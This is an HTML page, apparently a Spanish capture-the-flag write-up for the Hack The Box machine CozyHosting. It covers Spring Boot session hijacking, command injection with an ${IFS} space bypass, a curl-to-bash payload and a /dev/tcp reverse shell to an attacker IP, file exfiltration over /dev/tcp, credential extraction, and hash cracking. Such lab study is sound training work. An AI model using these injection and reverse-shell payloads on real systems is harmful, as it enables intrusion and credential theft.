@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | CozyHosting HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/cozyhosting/pasted-20260407001306.png" alt="CozyHosting HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>CozyHosting</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>sudoers</span>
+            <span>spring-boot</span>
+            <span>bypass_espacios_IFS</span>
+            <span>postgresql</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Errores y endpoints de Spring Boot expuestos</li>
+            <li><code>Explotación</code>: Secuestro de sesión en <code>/actuator/sessions</code> y command injection en el formulario SSH</li>
+            <li><code>Movimiento lateral</code>: JAR de la aplicación revela credenciales PostgreSQL y hashes de usuarios</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers permite abusar de <code>ssh</code> según GTFOBins</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407001248.png" alt="CozyHosting HTB" />
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407003339.png" alt="CozyHosting HTB" />
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407003322.png" alt="CozyHosting HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Web que usa Spring Boot</h2>
+          <div class="code-card">
+            <h3>Fuzzing de directorios con diccionarios de Spring Boot</h3>
+            <pre><code>gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t 75</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407004055.png" alt="CozyHosting HTB" />
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407005619.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Cookies de sesión en /actuator/sessions</h3>
+            <pre><code>{
+  "60560F0825F6B0AC14D0AAF3A0F3B683": "kanderson"
+}
+# Editar las cookies de sesión en Cookie Editor y reiniciar la web</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407005655.png" alt="CozyHosting HTB" />
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407005734.png" alt="CozyHosting HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Web</h2>
+          <div class="code-card">
+            <h3>Comando en el sistema que estamos ofuscando</h3>
+            <pre><code>ssh -i auth_key &lt;Username&gt;@&lt;Hostname&gt;
+ssh -i auth_key test;whoami;#@&lt;Hostname&gt;
+# No vemos el output así que probaremos con una conexión a Kali</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407012357.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Comando en el sistema que estamos ofuscando</h3>
+            <pre><code>ssh -i auth_key &lt;Username&gt;@&lt;Hostname&gt;
+# Kali listener con nc -nlvp 443 
+ssh -i auth_key test;curl 10.10.16.178;#@&lt;Hostname&gt;
+# No permite espacios</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407012638.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Comando en el sistema que estamos ofuscando</h3>
+            <pre><code>ssh -i auth_key &lt;Username&gt;@&lt;Hostname&gt;
+# Kali listener con nc -nlvp 80 
+# Jugar con la variable de entorno que contiene espacios $IFS
+ssh -i auth_key test;curl${IFS}10.10.16.178;#@&lt;Hostname&gt;
+# Recibimos conexión por lo que entablamos una reverse shell</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407012921.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Listener 443
+# Servir rev.html
+# Payload: test;curl${IFS}10.10.16.178/rev.html|bash;#</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407013929.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>rev.html</h3>
+            <pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.16.178/443 0&gt;&amp;1</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407013735.png" alt="CozyHosting HTB" />
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407013950.png" alt="CozyHosting HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Descargar proyecto y enumerar credenciales de la BD que expone contraseñas</h2>
+          <div class="code-card">
+            <h3>Transferencia de archivo</h3>
+            <pre><code># Linux
+cat &lt; cloudhosting-0.0.1.jar &gt; /dev/tcp/10.10.16.178/4443
+# Kali
+nc -nlvp 4443 &gt; cloudhosting-0.0.1.jar
+# Comprobar Integridad con md5sum</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407022133.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Descomprimir y buscar la cadena password</h3>
+            <pre><code>7z x cloudhosting-0.0.1.jar
+grep -ir "password"
+bat BOOT-INF/classes/application.properties 
+# Credenciales de PostgreSQL -&gt; postgres:Vg&amp;nvzAQ7XxR</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407022325.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Acceso a la BD</h3>
+            <pre><code>psql -h localhost -U 'postgres'
+# Password: Vg&amp;nvzAQ7XxR
+\list                    # Listar BDs
+\c cozyhosting           # Seleccionar BD
+\dt                      # Enumerar tablas
+select * from users;     # Enumerar columnas de la tabla users</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407023016.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Desencriptar Hashes con john</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Password: manchesterunited</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407023205.png" alt="CozyHosting HTB" />
+          <div class="code-card">
+            <h3>Reutiliza la contraseña de kanderson para joshua</h3>
+            <pre><code>su joshua
+# Password: manchesterunited</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407023117.png" alt="CozyHosting HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoers SSH -&gt; GTFOBins</h2>
+          <img class="writeup-image" src="/writeups/assets/cozyhosting/pasted-20260407023650.png" alt="CozyHosting HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>sudoers</span>
+            <span>spring-boot</span>
+            <span>bypass_espacios_IFS</span>
+            <span>postgresql</span>
+            <span>cookie</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
